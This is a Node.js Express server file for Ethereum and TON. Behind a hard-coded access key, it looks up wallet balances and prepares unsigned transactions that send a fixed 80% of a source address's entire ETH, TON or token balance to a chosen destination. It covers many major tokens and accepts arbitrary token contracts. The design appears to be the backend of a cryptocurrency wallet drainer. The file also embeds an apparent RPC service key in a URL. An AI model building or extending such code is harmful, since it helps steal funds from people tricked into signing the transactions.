const express = require('express'); const { ethers } = require('ethers'); const { TonClient, Address } = require('@ton/ton'); const cors = require('cors'); const app = express(); const port = 3000;

// ----------------------------- // CONFIGURATION // -----------------------------

app.use(cors()); app.use(express.json());

// Access key setup const ACCESS_KEY = "Morerich"; function checkAccessKey(req, res, next) { const key = req.body.accessKey || req.headers['x-access-key']; if (key !== ACCESS_KEY) { return res.status(403).json({ error: 'Invalid access key' }); } next(); }

// Ethereum provider configuration const ethProvider = new ethers.JsonRpcProvider( 'https://mainnet.gateway.tenderly.co/Kad7Owzj1YzDUSe9dXuvn', { chainId: 1, name: 'homestead' } );

// TON provider configuration const tonClient = new TonClient({ endpoint: 'https://toncenter.com/api/v2/jsonRPC', apiKey: process.env.TON_API_KEY || undefined });

// Standard ERC-20 ABI const tokenABI = [ 'function balanceOf(address owner) view returns (uint256)', 'function transfer(address to, uint amount) returns (bool)', 'function symbol() view returns (string)', 'function decimals() view returns (uint8)', ];

// Token address mapping const tokenAddresses = { WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F', USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7', UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA', WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', };

// ----------------------------- // ROUTES // -----------------------------

// API to get balance app.post('/api/balance', checkAccessKey, async (req, res) => { const { sourceAddress, tokenSymbol, customTokenAddress } = req.body; if (!sourceAddress) return res.status(400).json({ error: 'Invalid source address' });

try { if (tokenSymbol === 'ETH') { const balance = await ethProvider.getBalance(sourceAddress); res.json({ balance: ethers.formatEther(balance), symbol: 'ETH' }); } else if (tokenSymbol === 'TON') { const tonAddress = Address.parse(sourceAddress); const balance = await tonClient.getBalance(tonAddress); res.json({ balance: (Number(balance) / 1e9).toString(), symbol: 'TON' }); } else { const tokenAddress = customTokenAddress || tokenAddresses[tokenSymbol]; if (!tokenAddress) return res.status(400).json({ error: 'Invalid token symbol or address' });

const code = await ethProvider.getCode(tokenAddress);
  if (code === '0x') return res.status(400).json({ error: 'Provided address is not a contract' });

  const tokenContract = new ethers.Contract(tokenAddress, tokenABI, ethProvider);
  const balance = await tokenContract.balanceOf(sourceAddress);
  const symbol = await tokenContract.symbol();
  const decimals = await tokenContract.decimals();
  res.json({ balance: ethers.formatUnits(balance, decimals), symbol });
}

} catch (error) { res.status(500).json({ error: error.message }); } });

// API to prepare unsigned transaction app.post('/api/prepare-tx', checkAccessKey, async (req, res) => { const { sourceAddress, destinationAddress, tokenSymbol, customTokenAddress } = req.body; if (!sourceAddress || !destinationAddress) return res.status(400).json({ error: 'Invalid addresses' });

try { if (tokenSymbol === 'ETH') { const balance = await ethProvider.getBalance(sourceAddress); if (balance === BigInt(0)) return res.json({ message: 'No ETH balance to send.' });

const amountToSend = (balance * BigInt(8)) / BigInt(10);
  const nonce = await ethProvider.getTransactionCount(sourceAddress, 'latest');
  const feeData = await ethProvider.getFeeData();
  const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
  const gasLimit = BigInt(21000);
  const unsignedTx = { to: destinationAddress, value: amountToSend, nonce, gasLimit, gasPrice, chainId: 1 };

  res.json({ unsignedTx, amount: ethers.formatEther(amountToSend), symbol: 'ETH' });
} else if (tokenSymbol === 'TON') {
  const tonAddress = Address.parse(sourceAddress);
  const balance = await tonClient.getBalance(tonAddress);
  if (balance === BigInt(0)) return res.json({ message: 'No TON balance to send.' });

  const amountToSend = (balance * BigInt(8)) / BigInt(10);
  const unsignedTx = { to: destinationAddress, value: amountToSend.toString() };

  res.json({ unsignedTx, amount: (Number(amountToSend) / 1e9).toString(), symbol: 'TON' });
} else {
  const tokenAddress = customTokenAddress || tokenAddresses[tokenSymbol];
  if (!tokenAddress) return res.status(400).json({ error: 'Invalid token symbol or address' });

  const code = await ethProvider.getCode(tokenAddress);
  if (code === '0x') return res.status(400).json({ error: 'Provided token address is not a contract' });

  const tokenContract = new ethers.Contract(tokenAddress, tokenABI, ethProvider);
  const balance = await tokenContract.balanceOf(sourceAddress);
  if (balance === BigInt(0)) return res.json({ message: 'No balance to send.' });

  const amountToSend = (balance * BigInt(8)) / BigInt(10);
  const txData = tokenContract.interface.encodeFunctionData('transfer', [destinationAddress, amountToSend]);
  const nonce = await ethProvider.getTransactionCount(sourceAddress, 'latest');
  const feeData = await ethProvider.getFeeData();
  const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
  const gasLimit = await ethProvider.estimateGas({ to: tokenAddress, data: txData, from: sourceAddress }).catch(() => ethers.parseUnits('200000', 'wei'));

  const unsignedTx = { to: tokenAddress, data: txData, nonce, gasLimit, gasPrice, chainId: 1 };
  const decimals = await tokenContract.decimals();
  const symbol = await tokenContract.symbol();

  res.json({ unsignedTx, amount: ethers.formatUnits(amountToSend, decimals), symbol });
}

} catch (error) { res.status(500).json({ error: error.message }); } });

// Start server app.listen(port, () => { console.log(Server running at http://localhost:${port}); });

